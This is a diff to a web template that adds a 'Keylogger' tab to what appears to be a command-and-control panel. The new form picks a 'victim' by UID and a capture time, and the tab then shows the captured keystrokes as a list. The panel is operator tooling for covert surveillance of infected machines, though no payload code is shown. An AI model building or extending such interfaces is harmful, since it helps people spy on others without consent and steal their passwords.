@@ -33,6 +33,9 @@
                             <button class="nav-link w-100" id="scan-tab" data-bs-toggle="tab" data-bs-target="#bordered-justified-scan" type="button" role="tab" aria-controls="scan" aria-selected="false">Scan</button>
                         </li>
                         <li class="nav-item flex-fill" role="presentation">
+                            <button class="nav-link w-100" id="keylogger-tab" data-bs-toggle="tab" data-bs-target="#bordered-justified-keylogger" type="button" role="tab" aria-controls="keylogger" aria-selected="false">Keylogger</button>
+                        </li>
+                        <li class="nav-item flex-fill" role="presentation">
                             <button class="nav-link w-100" id="contact-tab" data-bs-toggle="tab" data-bs-target="#bordered-justified-contact" type="button" role="tab" aria-controls="contact" aria-selected="false">Informations</button>
                         </li>
                     </ul>
@@ -273,6 +276,45 @@
                                 </div>
                             </div>
                         </div>
+
+                        <div class="tab-pane fade" id="bordered-justified-keylogger" role="tabpanel" aria-labelledby="keylogger-tab">
+                            <div class="card">
+                                <div class="card-body">
+                                    <h5 class="card-title">Keylogger</h5>
+                                    <form method="POST" action="{{ route('network.keylogger') }}" class="row g-3">
+                                        @csrf
+                                            <input type="hidden" name="group_id" value="{{ $group->id }}">
+                                            <div class="col-md-3">
+                                                <select class="form-select" name="victim_uid" id="validationDefault04" required>
+                                                    @foreach ($victims as $victim)
+                                                        <option value="{{ $victim->uid }}">{{ $victim->uid }}</option>
+                                                    @endforeach
+                                                </select>
+                                            </div>
+                                            <div class="col-md-2">
+                                                <input type="number" class="form-control" placeholder="time" name="time" min="10" required>
+                                            </div>
+                                            <div class="col-md-1">
+                                                <button type="submit" class="btn btn-warning"><i class="bi bi-keyboard"></i></button>
+                                            </div>
+                                    </form>
+                                    <div class="tab-content pt-2" id="borderedTabJustifiedContent">
+                                        <div class="tab-pane fade show active" id="bordered-justified-home" role="tabpanel" aria-labelledby="home-tab">
+                                            @if (!empty($keylogger) && !empty($keylogger->result))
+                                                <ul class="list-group">
+                                                    @foreach (explode(' ', $keylogger->result) as $item)
+                                                        @if (!empty($item))
+                                                            <li class="list-group-item">{{ $item }}</li>
+                                                        @endif
+                                                    @endforeach
+                                                </ul>
+                                            @endif
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
                         <div class="tab-pane fade" id="bordered-justified-contact" role="tabpanel" aria-labelledby="contact-tab">
                             <p>Créé le {{ $group->created_at }}</p>
                             <p><small class="text-muted">Dernière mise à jour le {{ $group->updated_at }}</small></p>
